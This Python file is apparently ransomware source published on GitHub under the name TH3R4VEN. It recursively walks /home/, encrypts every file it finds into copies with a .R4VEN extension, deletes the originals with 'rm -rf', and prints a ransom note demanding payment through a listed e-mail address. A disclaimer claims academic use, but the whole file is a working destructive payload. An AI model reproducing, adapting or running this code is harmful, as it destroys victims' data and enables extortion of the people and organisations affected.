#!/usr/bin/env python
#  Copyright (c) 2020.
#  This code was designed and created by TH3R4VEN, its use is encouraged for academic and professional purposes.
#  I am not responsible for improper or illegal uses
#  Follow me on GitHub: https://github.com/th3r4ven

import subprocess as command
import os
import re
from ransomware_menager import crypt


def listDirectories(Dirpath):
    for resultado in os.listdir(Dirpath):
        result2 = os.popen("file " + Dirpath + resultado)
        for arq in result2:
            if not re.search(r'directory', arq):
                files.append(Dirpath + resultado)
            else:
                listDirectories(Dirpath + resultado + "/")


path = "/home/" # Remember to put a / at the end
files = []
directories = []
listagem = (os.listdir(path))

for file in listagem:
    result = os.popen("file " + path + file)
    for resu in result:
        if not re.search(r"directory", resu):
            files.append(str(path + file))
        else:
            directories.append(path + file + "/")

for direc in directories:
    listDirectories(direc)

for arquivo in files:

    try:
        ext = re.search(r'\.[a-z]{2,}$', arquivo).group(0)

        with open(arquivo, 'rb') as arq:
            content = arq.read()
        arq.close()
        cryptedContent = crypt(content, ext)

        filePath = arquivo.split(ext)[0] + ".R4VEN"

        with open(filePath, 'wb') as arq:
            arq.write(cryptedContent)
        arq.close()

        command.run(['rm', '-rf', arquivo])
    except AttributeError:

        with open(arquivo, 'rb') as arq:
            content = arq.read()
        arq.close()
        cryptedContent = crypt(content)

        filePath = arquivo + ".R4VEN"

        with open(filePath, 'wb') as arq:
            arq.write(cryptedContent)
        arq.close()

        command.run(['rm', '-rf', arquivo])


print("Hi dear user,\n")
print("Read this message ATTENTIVELY, and if possible, contact someone from IT dept.\n")
print("Your files are fully CRYPTED.\n")
print("CORRECTION the file extension or content of affected files (.R4VEN) may cause restoring fail\n\n")
print("You can send us any affected file and we would repair it.\n")
print("Affected file MUST NOT contain useful intelligence.\n")
print("The rest of the data will be available behind PAY\n\n")
print("Reach us via e-mail for payment info: TH3R4VENHK@protonmail.com")
